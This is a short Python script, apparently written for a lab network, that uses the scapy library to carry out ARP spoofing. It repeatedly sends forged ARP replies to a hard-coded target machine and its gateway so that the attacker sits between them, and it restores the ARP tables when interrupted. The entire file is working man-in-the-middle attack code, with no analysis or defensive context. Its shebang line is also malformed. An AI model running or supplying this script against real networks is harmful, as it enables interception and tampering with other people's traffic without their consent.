#! usr/env/bin/python
import scapy.all as scapy
import time
import sys
#hacker_mac = "00:0c:29:d5:cb:65"
target_ip = "192.168.159.143"
gateway_ip = "192.168.159.2"

def Get_MAC(ip):
    # Using ARP to ask who has target IP
    arp_request = scapy.ARP(pdst=ip)
    # Broadcast MAC ADDRESS
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    # Sending the ARP_BroadCast
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def Spoof(target_ip,spoof_ip):
    # Sending ARP Response to Target Machine
    target_mac = Get_MAC(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #                 Target Machine (IP ADDRESS) Target Machine (MAC ADDRESS) Router's IP ADDRESS
    scapy.sendp(packet,verbose=False)

def restoring(destination_ip,source_ip):
    destination_mac = Get_MAC(destination_ip)
    source_mac = Get_MAC(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc = source_ip,hwsrc=source_mac)
    scapy.sendp(packet,count  = 4,verbose=False)

n_packets = 0
try:
    while True:
        Spoof(target_ip,gateway_ip)
        Spoof(gateway_ip,target_ip)
        n_packets += 2
        print("\r[+] Sent packets: "+ str(n_packets),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Received CTRL+C ---- Restoring ARP Spoofing")
    restoring(target_ip, gateway_ip)
    restoring(gateway_ip, target_ip)

